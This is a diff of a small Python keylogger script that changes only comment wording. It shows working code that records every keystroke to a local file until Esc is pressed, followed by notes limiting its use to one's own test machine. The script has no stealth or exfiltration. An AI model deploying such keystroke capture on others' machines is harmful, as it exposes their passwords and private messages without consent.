@@ -3,26 +3,26 @@
 #Stops gracefully when you press a specific key (e.g., Esc).
 #---------------------------------------------------------------------------------------------------#
 
-# File where keystrokes will be saved
+# The file where the following keystrokes will be saved
 log_file = "log.txt"
 
 def on_press(key):
     try:
-        # Open file in append mode
+        # Opens the file in the append mode
         with open(log_file, "a") as f:
             f.write(f"{key.char}")
     except AttributeError:
-        # Handle special keys
+        # This will handle any special keys
         with open(log_file, "a") as f:
             f.write(f"[{key}]")
 
 def on_release(key):
-    # Stop listener if Esc is pressed
+    # Stop listening if the Esc key is pressed
     if key == keyboard.Key.esc:
         print("Stopping keylogger...")
         return False
 
-# Start listening
+# The code where it will start listening to keystrokes
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
@@ -34,4 +34,5 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
 #Pressing Esc will stop the script cleanly.
 #⚠️ Important Notes:
 #This should only be run in a controlled/testing environment (like your own machine in a test folder).
+
 #Do not use this on someone else’s computer or without explicit permission — that would be illegal.
